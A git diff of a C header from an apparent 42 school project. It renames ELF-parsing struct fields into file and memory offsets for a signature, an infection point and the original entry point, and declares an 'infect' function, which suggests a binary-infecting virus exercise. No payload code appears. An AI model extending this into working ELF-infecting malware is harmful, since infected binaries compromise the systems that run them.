@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/20 11:53:19 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/21 12:32:03 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -51,11 +51,14 @@ typedef struct elf_data {
 	Elf64_Phdr	*segments;
 	byte		*file;
 	int64_t		fd;
-	size_t		signature_offset;
-	size_t		infection_offset;
-	size_t		original_entry_point;
-	size_t		mmap_size;
-	size_t		original_eof;
+	size_t		signature_offset_file;
+	size_t		signature_offset_mem;
+	size_t		infection_offset_file;
+	size_t		infection_offset_mem;
+	size_t		original_entry_point_file;
+	size_t		original_entry_point_mem;
+	size_t		original_size;
+	size_t		new_size;
 }	elf_data;
 
 #define DT_UNKNOWN  0   // Unknown file type
@@ -85,6 +88,7 @@ typedef struct elf_data {
 size_t		ft_strlen(str buff);
 bool		ft_memcmp(const byte *a, const byte *b, size_t size);
 void		ft_memcpy(byte *dest, const byte *src, size_t size);
+void		print_data(elf_data *data);
 
 //	Infection
 bool		infect(profiling *this, const str path);
